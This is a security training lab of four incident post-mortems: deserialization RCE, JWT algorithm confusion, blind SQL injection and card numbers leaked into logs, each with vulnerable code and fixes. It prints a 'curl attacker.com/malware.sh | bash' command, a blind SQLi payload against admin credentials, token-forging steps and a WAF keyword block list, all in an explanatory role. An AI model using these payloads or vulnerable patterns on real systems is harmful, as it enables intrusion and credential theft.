# PRODUCTION SCENARIOS: Security, Threat Response & Cryptographic War Stories
## Lab 09 | Production Engineering Academy — Top 0.0001% Engineering

---

## Scenario 1: The $4,500,000 Insecure Deserialization RCE Breach

### 1. Incident Context & Architecture
- **Service**: `legacy-user-session-gateway` (Java 11, Redis Session Store).
- **Incident Severity**: P0 / Breach of Corporate Perimeter.
- **Impact**: Attacker gained remote shell execution, compromised AWS IAM metadata credentials, and exfiltrated 450,000 customer records.

### 2. The Attack Mechanics: The Redis Gadget Chain
The application used Spring Session with standard Java serialization to store session data in Redis:
```java
// VULNERABLE CODE:
byte[] rawBytes = redisTemplate.opsForValue().get(sessionId);
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(rawBytes))) {
    UserSession session = (UserSession) ois.readObject();
}
```
**The Exploit Path**:
1. An attacker exploited an unauthenticated Redis instance via an SSRF vulnerability in an internal proxy.
2. The attacker wrote a weaponized binary payload into a Redis key matching a target session format.
3. The payload contained a serialized **Apache Commons Collections 3.1 `InvokerTransformer` gadget chain**.
4. When a user or health-check hit the session gateway:
   - `ObjectInputStream.readObject()` executed.
   - The gadget chain invoked `Runtime.getRuntime().exec("curl attacker.com/malware.sh | bash")`.
5. The shell script queried the AWS EC2 Instance Metadata Service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) and exfiltrated administrative IAM keys!

### 3. Forensic Autopsy & Emergency Containment
- **T+00:15**: eBPF security telemetry detected a spawned `/bin/sh` process originating from PID 1 (`java`).
- **T+00:20**: SREs applied an emergency quarantine NetworkPolicy isolating the container from the network.
- **T+00:35**: Security Operations revoked the compromised IAM role in AWS STS, cutting off exfiltration.

### 4. Systemic Post-Mortem Remediation
1. Replaced all native Java serialization with **strict Jackson JSON serialization**.
2. Configured the global JVM serial filter on all base Docker images:
   ```bash
   -Djdk.serialFilter="!*"
   ```
3. Enforced AWS IMDSv2 (requiring token headers) and blocked access to `169.254.169.254` via Kubernetes egress NetworkPolicies.

---

## Scenario 2: The Algorithm Confusion Admin Takeover

### 1. Incident Context & Discovery
- **Service**: `enterprise-b2b-api-gateway` (Spring Security, JWT).
- **Incident**: An external penetration testing team reported full unauthenticated administrative access to all internal tenant accounts.

### 2. The Exploit Mechanics: RSA to HMAC Key Confusion
The API gateway verified client JWTs using an asymmetric RSA key pair:
- The public RSA key was accessible via `https://api.corp.internal/.well-known/jwks.json`.
- The verification code in the gateway:
  ```java
  // BUG: Did not validate the 'alg' header!
  Jwts.parser().setSigningKey(rsaPublicKey).parseClaimsJws(token);
  ```
**The Penetration Tester's Attack**:
1. Copied the server's public RSA key in PEM format:
   ```text
   -----BEGIN PUBLIC KEY-----
   MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...
   -----END PUBLIC KEY-----
   ```
2. Generated a forged token:
   - Header: `{"alg": "HS256", "typ": "JWT"}`
   - Claims: `{"sub": "super_admin", "tenant": "all", "roles": ["ADMIN"]}`
3. Signed the token using standard **HMAC-SHA256 (HS256)**, passing the **raw bytes of the public key as the secret key**.
4. The gateway parsed the token:
   - Saw `alg: HS256`.
   - Treated `rsaPublicKey` as a symmetric HMAC secret.
   - The HMAC signature computed by the gateway matched the signature in the forged token!
5. The tester was authenticated as `super_admin` across all tenants!

### 3. Production Remediation
Implemented **Strict Algorithm Pinning**:
```java
Jwts.parser()
    .requireAlgorithm(SignatureAlgorithm.RS256) // HARD ENFORCEMENT
    .setSigningKey(rsaPublicKey)
    .build()
    .parseSignedClaims(token);
```
Any incoming token specifying `HS256`, `none`, or any non-RS256 algorithm is rejected immediately with HTTP 401.

---

## Scenario 3: The Blind SQL Injection Data Exfiltration Outage

### 1. Incident Context
- **Service**: `customer-billing-service` (Spring Data JPA, PostgreSQL).
- **The Symptom**: PostgreSQL CPU pegged at 100%; database connections exhausted.
- **Initial Misdiagnosis**: The engineering team assumed this was a standard traffic surge or missing index.

### 2. Forensic Query Inspection via `pg_stat_activity`
```sql
SELECT query FROM pg_stat_activity WHERE state = 'active' ORDER BY query_start ASC;
```
*The Malicious Query Found*:
```sql
SELECT * FROM invoices WHERE customer_id = 4821 
ORDER BY (CASE WHEN (SELECT ascii(substr(password_hash,1,1)) FROM admin_credentials) = 97 
          THEN pg_sleep(10) ELSE id END);
```
An attacker was executing **Time-Based Blind SQL Injection**!
- The code had safely parameterized `customer_id`, but concatenated the `sortBy` query parameter:
  ```java
  // VULNERABLE:
  String query = "SELECT * FROM invoices WHERE customer_id = ? ORDER BY " + sortBy;
  ```
- The attacker used `pg_sleep(10)` to infer character values of admin passwords. Because 50 concurrent automated attacker scripts were running `pg_sleep(10)` in parallel, all 50 database worker threads were locked in sleep state, knocking out legitimate customer billing!

### 3. Production Remediation
1. Edge WAF rule immediately deployed blocking SQL keywords (`pg_sleep`, `substr`) in URL query strings.
2. Refactored the Java repository to use a strict Java `enum` for sorting parameters:
   ```java
   public enum InvoiceSort {
       DATE("created_at"), AMOUNT("total_amount");
   }
   ```
3. Database CPU dropped from 100% to 12%; service restored.

---

## Scenario 4: The Plaintext Secret in Log Aggregation Compliance Crisis

### 1. Incident Context & Regulatory Escalation
- **Event**: Annual PCI-DSS Level 1 compliance audit.
- **Finding**: Critical Non-Compliance violation.
- **The Discovery**: A search in the centralized Elasticsearch cluster revealed over **2,400,000 unencrypted credit card numbers (PANs) and CVVs stored in plaintext logs**!

### 2. Root Cause: Lombok `@ToString` on Domain Entities
An engineer added Lombok `@Data` / `@ToString` to the core `PaymentAuthorizationRequest` class:
```java
@Data // Automatically generates toString() including all fields!
public class PaymentAuthorizationRequest {
    private String cardNumber;
    private String cvv;
    private double amount;
}
```
In an exception handling block:
```java
log.error("Failed to authorize payment: request={}", request); 
// Emitted: request=PaymentAuthorizationRequest(cardNumber=4111222233334444, cvv=123, amount=99.00)
```
For 6 months, every failed transaction had been logging plaintext credit card credentials directly to disk and shipping them to Elasticsearch!

### 3. Production Remediation
1. Implemented strict Logback masking providers that regex-mask 16-digit card patterns before writing to console or disk.
2. Refactored DTOs to explicitly exclude sensitive fields:
   ```java
   @ToString(exclude = {"cardNumber", "cvv"})
   ```
3. Executed an automated Elasticsearch purge deleting all historical indices containing unmasked credit card patterns.
